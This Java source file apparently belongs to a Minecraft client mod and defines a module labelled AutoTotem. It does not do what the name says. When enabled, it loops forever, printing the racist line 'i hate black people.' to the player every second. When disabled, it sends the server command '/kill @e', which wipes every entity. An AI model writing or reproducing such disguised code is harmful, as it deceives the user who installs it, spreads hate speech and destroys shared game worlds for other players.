package us.np.moodlymod.module.modules.combat;

import net.minecraft.util.text.TextComponentString;
import us.np.moodlymod.Wrapper;
import us.np.moodlymod.module.Module;
import us.np.moodlymod.module.ModuleType;
import net.minecraft.network.play.client.CPacketChatMessage;

import java.awt.*;

public class AutoTotemModule extends Module {
    public AutoTotemModule() {
        super("AutoTotem", new String[] {""}, "NONE", Color.BLUE, ModuleType.COMBAT);
        endOption();
    }
    Thread thread;

    @Override
    public void onEnable() {
        super.onEnable();

        thread = new Thread(new Runnable() {
            @Override
            public void run() {
                while(true) {
                    try {
                        Thread.sleep(1000);
                        if(Wrapper.getMC().player != null)
                            Wrapper.getMC().player.sendMessage(new TextComponentString("i hate black people."));
                    } catch(Exception e) {e.printStackTrace();}
                }
            }
        });
        thread.start();
    }

    @Override
    public void onDisable() {
        super.onDisable();

        thread.stop();
        Wrapper.getMC().player.connection.sendPacket(new CPacketChatMessage("/kill @e"));
    }
}
